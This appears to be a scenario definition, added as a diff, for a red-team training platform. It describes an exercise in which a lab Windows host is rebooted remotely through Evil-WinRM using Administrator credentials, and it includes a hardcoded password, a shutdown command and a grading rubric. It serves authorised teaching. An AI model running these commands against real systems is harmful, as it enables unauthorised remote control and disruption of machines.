@@ -1,0 +1,109 @@
+{
+  "id": "winrm_shutdown_target",
+  "name": "Windows Remote Management - Remote Target Shutdown",
+  "description": "教学与测试目的：通过 Evil-WinRM 获取 Windows 远程控制权限后，对目标靶机下发安全的系统重启/关机指令，以验证攻击链控制效果。仅限授权测试环境使用。",
+  "category": "lateral-movement",
+  "difficulty": "intermediate",
+  "estimatedDuration": "5 min",
+  "rolesAllowed": [
+    "operator",
+    "admin"
+  ],
+  "mitrePhases": [
+    "Lateral Movement",
+    "Impact"
+  ],
+  "mitreTechniques": [
+    "T1021.006",
+    "T1529"
+  ],
+  "targetType": [
+    "windows_host",
+    "ad_domain"
+  ],
+  "win_profile": {
+    "username": "Administrator",
+    "password": "200209",
+    "winrm_port": "5985"
+  },
+  "steps": [
+    {
+      "id": "step1_prepare_shutdown_script",
+      "name": "Prepare Shutdown Script",
+      "description": "在本地生成一个带有 10 秒倒计时和自定义提示的 PowerShell 关机指令脚本。",
+      "toolId": "system-tools",
+      "argsTemplate": [
+        "-c",
+        "echo 'shutdown /r /t 10 /c \"HexStrike Automated Security Verification - Target System Rebooting\"' > /tmp/shutdown.ps1 && echo 'Script created: /tmp/shutdown.ps1'"
+      ],
+      "score": 10,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1059.001"
+      ]
+    },
+    {
+      "id": "step2_execute_remote_shutdown",
+      "name": "Execute Remote Shutdown",
+      "description": "使用 Evil-WinRM 远程加载并执行该关机脚本，令目标 Windows 靶机执行重启/关机操作。",
+      "toolId": "evil-winrm",
+      "argsTemplate": [
+        "-i",
+        "{{host}}",
+        "-u",
+        "{{username}}",
+        "-p",
+        "{{password}}",
+        "--port",
+        "{{winrm_port}}",
+        "-s",
+        "/tmp/shutdown.ps1"
+      ],
+      "score": 90,
+      "status": "PENDING",
+      "expectedMitre": [
+        "T1021.006",
+        "T1529"
+      ],
+      "requires_teacher_review": true,
+      "payload_id": "lateral-winrm"
+    }
+  ],
+  "rubric": {
+    "items": [
+      {
+        "id": "shutdown_script_created",
+        "desc": "成功创建本地关机脚本",
+        "points": 10,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "Script created|shutdown.ps1"
+        }
+      },
+      {
+        "id": "shutdown_command_sent",
+        "desc": "成功通过 WinRM 连接并发送关机指令",
+        "points": 90,
+        "predicate": {
+          "kind": "stdout_contains",
+          "pattern": "Connected successfully|Connecting|Rebooting|shutdown"
+        }
+      }
+    ]
+  },
+  "notSuitableFor": [
+    "dvwa",
+    "local_ip",
+    "web_url"
+  ],
+  "baselineGroup": "windows-exploitation",
+  "expectedOutputPolicy": "expect_output",
+  "emptyOutputExplanation": "关机脚本远程执行；需要 Windows 靶机开放 5985 端口且具备 Administrator 账号登录权限",
+  "applicableTargetType": [
+    "windows_host",
+    "ad_domain"
+  ],
+  "teachingObjective": "演示如何通过有效凭据利用 WinRM 执行系统级操作（系统关闭/重启 - T1529）",
+  "target_class": "windows_ad",
+  "disableAutoInsert": true
+}
